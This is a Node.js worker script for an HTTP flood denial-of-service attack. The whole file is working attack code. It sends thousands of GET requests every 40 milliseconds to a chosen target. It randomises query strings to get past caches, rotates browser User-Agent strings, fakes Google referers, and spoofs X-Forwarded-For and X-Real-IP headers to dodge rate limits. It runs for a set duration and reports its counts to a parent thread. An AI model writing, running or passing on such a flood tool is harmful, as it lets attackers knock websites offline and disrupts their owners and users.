const { parentPort, workerData } = require('worker_threads');
const { URL } = require("url");
const http = require("http");
const https = require("https");

function startAggressiveFlood(target, duration) {
  const { request, Agent } = target.startsWith("https") ? https : http;
  const url = new URL(target);
  const agent = new Agent({ keepAlive: true, maxSockets: 99999 });

  const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 Chrome/111.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3) AppleWebKit/605.1.15 CriOS/112.0.5615.46 Mobile Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/112.0.1722.34 Chrome/111.0.0.0 Safari/537.36"
  ];

  let total = 0;
  let success = 0;
  let failed = 0;

  const randomIP = () => Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join(".");
  const randomQuery = () =>
    `?v=${Math.random().toString(36).substring(2)}&ts=${Date.now()}&z=${Math.floor(Math.random() * 100000)}`;

  function spam() {
    for (let i = 0; i < 2500; i++) {
      const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === "https:" ? 443 : 80),
        path: url.pathname + randomQuery(),
        method: "GET",
        headers: {
          "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
          "Referer": `https://google.com/search?q=${Math.random().toString(36).substring(2)}`,
          "X-Forwarded-For": randomIP(),
          "X-Real-IP": randomIP(),
          "Connection": "keep-alive"
        },
        agent
      };

      const req = request(options, res => {
        total++;
        if (res.statusCode >= 200 && res.statusCode < 400) success++;
        else failed++;
        res.resume();
      });

      req.on("error", () => {
        total++;
        failed++;
      });

      req.end();
    }
  }

  const spammer = setInterval(spam, 40);

  const logger = setInterval(() => {
    parentPort.postMessage({
      total,
      success,
      failed,
    });
  }, 1000);

  setTimeout(() => {
    clearInterval(spammer);
    clearInterval(logger);
    parentPort.postMessage({ done: true, total, success, failed });
  }, duration * 1000);
}

// Mulai flood berdasarkan data dari main thread
startAggressiveFlood(workerData.target, workerData.duration);